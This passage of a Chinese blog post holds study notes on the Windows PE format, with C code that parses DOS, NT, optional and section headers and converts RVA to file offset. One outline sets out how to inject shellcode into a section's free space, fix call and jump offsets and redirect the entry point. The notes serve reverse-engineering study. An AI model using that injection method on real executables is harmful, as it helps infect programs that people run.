class=\"type\">char</span>* FilePath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = (LPVOID)<span class=\"built_in\">OpenFile</span>(FilePath);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pFileBuffer == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pFileBuffer == NULL\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (*(PWORD)pDosHeader != IMAGE_DOS_SIGNATURE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;not a valid mz signature\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;valid mz signature\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------DOS header---------\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;DOS header: e_magic=%X\\n&quot;</span>,pDosHeader-&gt;e_magic);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;DOS header: e_lfanew=%X\\n&quot;</span>,pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------NT header---------\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;NT header: Signature=%X\\n&quot;</span>,pNTHeader-&gt;Signature);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------File header---------\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: Machine=%X\\n&quot;</span>,pFileHeader-&gt;Machine);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: NumberOfSections=%X\\n&quot;</span>,pFileHeader-&gt;NumberOfSections);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: TimeDateStamp=%X\\n&quot;</span>,pFileHeader-&gt;TimeDateStamp);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: SizeOfOptionalHeader=%X\\n&quot;</span>,pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;File header: Characteristics=%X\\n&quot;</span>,pFileHeader-&gt;Characteristics);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------Optional header---------\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: Magic=%X\\n&quot;</span>,pOptionHeader-&gt;Magic);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: SizeOfCode=%X\\n&quot;</span>,pOptionHeader-&gt;SizeOfCode);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: AddressOfEntryPoint=%X\\n&quot;</span>,pOptionHeader-&gt;AddressOfEntryPoint);\t</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: BaseOfCode=%X\\n&quot;</span>,pOptionHeader-&gt;BaseOfCode);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: BaseOfData=%X\\n&quot;</span>,pOptionHeader-&gt;BaseOfData);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: ImageBase=%X\\n&quot;</span>,pOptionHeader-&gt;ImageBase);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: SectionAlignment=%X\\n&quot;</span>,pOptionHeader-&gt;SectionAlignment);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: FileAlignment=%X\\n&quot;</span>,pOptionHeader-&gt;FileAlignment);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: SizeOfImage=%X\\n&quot;</span>,pOptionHeader-&gt;SizeOfImage);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: SizeOfHeaders=%X\\n&quot;</span>,pOptionHeader-&gt;SizeOfHeaders);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Optional header: CheckSum=%X\\n&quot;</span>,pOptionHeader-&gt;CheckSum);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(pFileBuffer);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* FilePath = <span class=\"string\">&quot;C:\\\\Users\\\\shinya\\\\Desktop\\\\Unpacker.exe&quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">ResolvePEHeader</span>(FilePath) ;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">union Test     //类型</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">sizeof取成员变量中最大的</span><br><span class=\"line\"></span><br><span class=\"line\">1、联合体的成员是共享内存空间的中</span><br><span class=\"line\">2、联合体的内存空间大小是联合体成员中对内存空间大小要求最大的空间大小</span><br><span class=\"line\">3、联合体最多只有一个成员有效</span><br><span class=\"line\"></span><br><span class=\"line\">Test test;</span><br><span class=\"line\">test.y = 0x12345678;</span><br><span class=\"line\">printf(&quot;%X\\n&quot;,test.x);\t//0x78</span><br><span class=\"line\">printf(&quot;%X\\n&quot;,test.y);  //0x12345678</span><br><span class=\"line\"></span><br><span class=\"line\">union</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;Testhaha;      //变量</span><br><span class=\"line\">Testhaha.y = 0x12345678;</span><br><span class=\"line\">printf(&quot;%d&quot;,Testhaha)   //0x12345678</span><br><span class=\"line\"></span><br><span class=\"line\">结构体也可以这么写</span><br><span class=\"line\">struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;shabi;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"节表\"><a class=\"markdownIt-Anchor\" href=\"#节表\">#</a> 节表</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class=\"line\">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];// 节表名称,如“.text” ,如果不是以\\0结尾，系统会截取8个字节长度处理</span><br><span class=\"line\">  //IMAGE_SIZEOF_SHORT_NAME=8,创建长度为9的数组，最后以0结尾，不要用char*</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">      //　共用体，也叫联合体，在一个“联合”内可以定义多种不同的数据类型， </span><br><span class=\"line\">//一个被说明为该“联合”类型的变量中，允许装入该“联合”所定义的任何一种数据，这些数据共享同一段内存，</span><br><span class=\"line\">//以达到节省空间的目的。union变量所占用的内存长度等于最长的成员的内存长度。</span><br><span class=\"line\">            DWORD   PhysicalAddress; //当前节的名称 ， 占8字节</span><br><span class=\"line\">            DWORD   VirtualSize; //内存中文件对齐大小</span><br><span class=\"line\">    &#125; Misc;   //对齐前的真实尺寸，可以不准确,没有程序照样运行，misc可以大于sizeofrawdata</span><br><span class=\"line\">    DWORD   VirtualAddress; //在内存中的偏移地址 +imageOfBase=真正的位置</span><br><span class=\"line\">    DWORD   SizeOfRawData; //当前节在文件中对齐后的大小 也就是节点的大小</span><br><span class=\"line\">    DWORD   PointerToRawData; //当前节在文件中的偏移 也就是文件的开始位置，一定是文件对齐的整数倍</span><br><span class=\"line\">    DWORD   PointerToRelocations; // 调试相关</span><br><span class=\"line\">    DWORD   PointerToLinenumbers;// 调试相关</span><br><span class=\"line\">    WORD    NumberOfRelocations;// 调试相关</span><br><span class=\"line\">    WORD    NumberOfLinenumbers;// 调试相关</span><br><span class=\"line\">    DWORD   Characteristics; //文件属性，比如该节数据属性是否为可执行属性，都在这里面</span><br><span class=\"line\">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230205140709262.png\" alt=\"image-20230205140709262\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230302175633767.png\" alt=\"image-20230302175633767\"></p>\n<p>MISC = a - b</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230205140950190.png\" alt=\"image-20230205140950190\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230205143439207.png\" alt=\"image-20230205143439207\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">标志(属性块) 常用特征值对照表：</span><br><span class=\"line\"></span><br><span class=\"line\">[值:00000020h] [IMAGE_SCN_CNT_CODE                // Section contains code.(包含可执行代码)]</span><br><span class=\"line\">[值:00000040h] [IMAGE_SCN_CNT_INITIALIZED_DATA    // Section contains initialized data.(该块包含已初始化的数据)]</span><br><span class=\"line\">[值:00000080h] [IMAGE_SCN_CNT_UNINITIALIZED_DATA  // Section contains uninitialized data.(该块包含未初始化的数据)]</span><br><span class=\"line\">[值:00000200h] [IMAGE_SCN_LNK_INFO                // Section contains comments or some other type of information.]</span><br><span class=\"line\">[值:00000800h] [IMAGE_SCN_LNK_REMOVE              // Section contents will not become part of image.]</span><br><span class=\"line\">[值:00001000h] [IMAGE_SCN_LNK_COMDAT              // Section contents comdat.]</span><br><span class=\"line\">[值:00004000h] [IMAGE_SCN_NO_DEFER_SPEC_EXC       // Reset speculative exceptions handling bits in the TLB entries for this section.]</span><br><span class=\"line\">[值:00008000h] [IMAGE_SCN_GPREL                   // Section content can be accessed relative to GP.]</span><br><span class=\"line\">[值:00500000h] [IMAGE_SCN_ALIGN_16BYTES           // Default alignment if no others are specified.]</span><br><span class=\"line\">[值:01000000h] [IMAGE_SCN_LNK_NRELOC_OVFL         // Section contains extended relocations.]</span><br><span class=\"line\">[值:02000000h] [IMAGE_SCN_MEM_DISCARDABLE         // Section can be discarded.]</span><br><span class=\"line\">[值:04000000h] [IMAGE_SCN_MEM_NOT_CACHED          // Section is not cachable.]</span><br><span class=\"line\">[值:08000000h] [IMAGE_SCN_MEM_NOT_PAGED           // Section is not pageable.]</span><br><span class=\"line\">[值:10000000h] [IMAGE_SCN_MEM_SHARED              // Section is shareable(该块为共享块).]</span><br><span class=\"line\">[值:20000000h] [IMAGE_SCN_MEM_EXECUTE             // Section is executable.(该块可执行)]</span><br><span class=\"line\">[值:40000000h] [IMAGE_SCN_MEM_READ                // Section is readable.(该块可读)]</span><br><span class=\"line\">[值:80000000h] [IMAGE_SCN_MEM_WRITE               // Section is writeable.(该块可写)]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>手动画图列数据</p>\n<p>写程序解析节表</p>\n<p>使用 notepad</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DOS头 00h-40h</span><br><span class=\"line\">40H-F7 垃圾数据</span><br><span class=\"line\">F8-FB signature</span><br><span class=\"line\">FC-10F 标准PE头 NumberOfSection = 7  sizeofoptionalheader = 0xF0</span><br><span class=\"line\">110H-1FF 可选PE头</span><br><span class=\"line\">200-227 节表1 .text   025E00  400</span><br><span class=\"line\">228-24F 节表2 .rdata  9A00    26200</span><br><span class=\"line\">250-277 节表3 .data   0E00    2FC00</span><br><span class=\"line\">278-29F 节表4 .pdata  1200    30A00</span><br><span class=\"line\">2A0-2C7 节表5 .didat  0200    31C00  </span><br><span class=\"line\">2C8-2ef 节表6 .rsrc   0C00    31E00</span><br><span class=\"line\">2f0-317 节表7 .reloc  0400    32A00</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Unpacker.exe</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DOS头 00h-39h</span><br><span class=\"line\">垃圾数据 40h-107h</span><br><span class=\"line\">NT头 108h-</span><br><span class=\"line\">file header 10Ch-11f</span><br><span class=\"line\">optional header 120-1ff</span><br><span class=\"line\">section </span><br><span class=\"line\">200 - 227 </span><br><span class=\"line\">.text  </span><br><span class=\"line\">misc 10AF0</span><br><span class=\"line\">VA 1000</span><br><span class=\"line\">soraw 11000</span><br><span class=\"line\">ptrd 1000</span><br><span class=\"line\">char 60000020</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"><span class=\"keyword\">while</span>(pFileHeader-&gt;NumberOfSections &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> name[<span class=\"number\">9</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">8</span>;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        name[i] = pSectionHeader-&gt;Name[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;---------SECTION_HEADER---------\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: Name=%s\\n&quot;</span>, name);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: Misc=%X\\n&quot;</span>, pSectionHeader-&gt;Misc);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: VirtualAddress=%X\\n&quot;</span>, pSectionHeader-&gt;VirtualAddress);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: SizeOfRawData=%X\\n&quot;</span>, pSectionHeader-&gt;SizeOfRawData);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: PointerToRawData=%X\\n&quot;</span>, pSectionHeader-&gt;PointerToRawData);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header: Characteristics=%X\\n&quot;</span>, pSectionHeader-&gt;Characteristics);</span><br><span class=\"line\">    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader + IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class=\"line\">    pFileHeader-&gt;NumberOfSections--;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230303182144938.png\" alt=\"image-20230303182144938\"></p>\n<p>sizeofheader = 所有头 + 节表 文件对齐后大小</p>\n<p>MISC 可能大于 sizeofrawdata，含有未初始化的数据，比如 char arr [1000]; 文件中不分配，但内存中分配</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FileBuffer -&gt; ImageBuffer</span><br><span class=\"line\"></span><br><span class=\"line\">1.分配新的内存，分配sizeofimage大小，初始化为0  (FileBuffer是按照文件大小分的，即ftell得出的尺寸)</span><br><span class=\"line\"></span><br><span class=\"line\">----接下来分块移动到内存中</span><br><span class=\"line\"></span><br><span class=\"line\">2.复制sizeofheaders，注意内存和文件的对齐，即内存中headers之后不一定直接是节</span><br><span class=\"line\"></span><br><span class=\"line\">3.循环复制节，从pintertorawdata开始，复制sizeofrawdata大小，复制到virtualaddress</span><br><span class=\"line\"></span><br><span class=\"line\">ImageBuffer -&gt; NewBuffer</span><br><span class=\"line\">1.开辟最后一个节的pointertorawdaata + sizeofrawdata</span><br><span class=\"line\"></span><br><span class=\"line\">2.复制头</span><br><span class=\"line\"></span><br><span class=\"line\">3.把virtualaddress 复制到 pointertorawdata ，大小为sizeofrawdata</span><br><span class=\"line\"></span><br><span class=\"line\">空闲节添加代码</span><br><span class=\"line\">1/读到filebuffer</span><br><span class=\"line\">2.到imagebuffer</span><br><span class=\"line\">3.判断空闲区是否够</span><br><span class=\"line\">4.判断加哪 imagebase + VA + MISC</span><br><span class=\"line\">5.复制shellcode</span><br><span class=\"line\">6.修正E8 x-imagebuffer+imagebase</span><br><span class=\"line\">7.修正E9</span><br><span class=\"line\">8.修改OEP</span><br><span class=\"line\">9.image -&gt; nnew</span><br><span class=\"line\">10.存盘</span><br><span class=\"line\"></span><br><span class=\"line\">如果不往代码区里填，需要改属性，判断拉伸后剩余空间是否够</span><br><span class=\"line\">在任意节里添加，封装函数</span><br><span class=\"line\">属性通过 | 取并集</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230206140901033.png\" alt=\"image-20230206140901033\"></p>\n<p>用函数写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD ReadPEFile(IN LPSTR lpszFile, OUT LPVOID* pFileBuffer); //失败返回0，否则实际读取大小</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD CopyFileBufferToImageBuffer(IN LPVOID PFileBuffer, OUT LPVOID* pImageBuffer);  //失败返回0，否则返回复制大小</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">bool MemeryToFile(IN LPVOID pMemBuffer, IN SIZE_T size, OUT LPSTR lpszFile);</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD RvaToFileOffset(IN LPVOID pFileBuffer, IN DWORD dwRva); //dwrva rva的值，返回转换后的rva的值，是吧返回0</span><br></pre></td></tr></table></figure>\n<p>2. 将 RVA 转为 FOA   RVA 相对偏移地址就是下面的 1234，即内存中相对的偏移</p>\n<p>FOA 文件中偏移，即下面的 634</p>\n<p>imagebuffer 中并不能运行，还需要做一些别的工作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">imagebuffer中为501234的节在文件中什么位置 ，malloc返回500000</span><br><span class=\"line\">imagebuffer开始的地址时malloc分的地址</span><br><span class=\"line\"></span><br><span class=\"line\">1.用501234-500000 = 1234</span><br><span class=\"line\"></span><br><span class=\"line\">2.循环判断1234在那个节中，大于第n个节virtualaddress，小于第n个节的virtualaddress+misc.virtualsize</span><br><span class=\"line\"></span><br><span class=\"line\">3.1234-第n个节表 = 1234 - 1000 = 234，即距离当前节开始的偏移</span><br><span class=\"line\"></span><br><span class=\"line\">4.pointertorawdata  +  234 = 400 + 234</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD RvaToFileOffset(IN LPVOID pFileBuffer, IN char* FilePath, DWORD dwRva)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = NULL;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = NULL;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = NULL;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = NULL;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(sizeof(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;pFileBuffer: %X\\n&quot;, pFileBuffer); //450068</span><br><span class=\"line\">\tprintf(&quot;DWRVA: %X\\n&quot;, dwRva); </span><br><span class=\"line\">\tDWORD MemOffset = (dwRva - (DWORD)pFileBuffer); //45C29C - 450068 = C234</span><br><span class=\"line\">\tprintf(&quot;MemOffset: %X\\n&quot;, 